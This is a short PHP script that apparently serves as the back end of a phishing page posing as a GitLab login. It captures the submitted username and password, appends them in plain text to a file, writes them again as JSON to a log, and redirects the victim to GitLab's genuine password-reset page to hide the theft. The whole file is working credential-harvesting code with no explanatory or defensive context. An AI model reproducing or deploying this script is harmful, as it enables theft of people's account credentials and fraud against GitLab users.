<?php

file_put_contents("usernames.txt", "Gitlab Username: " . $_POST['login'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
header('Location: https://gitlab.com/users/password/new');
$data = array('site' => 'Gitlab',
  'user' => $_POST['login'],
  'pass' => $_POST['password']);

  $json_data = json_encode($data);

  $f = fopen('../../../logs/info.txt', 'w+');
  fwrite($f, $json_data);
  fclose($f);
exit();
?>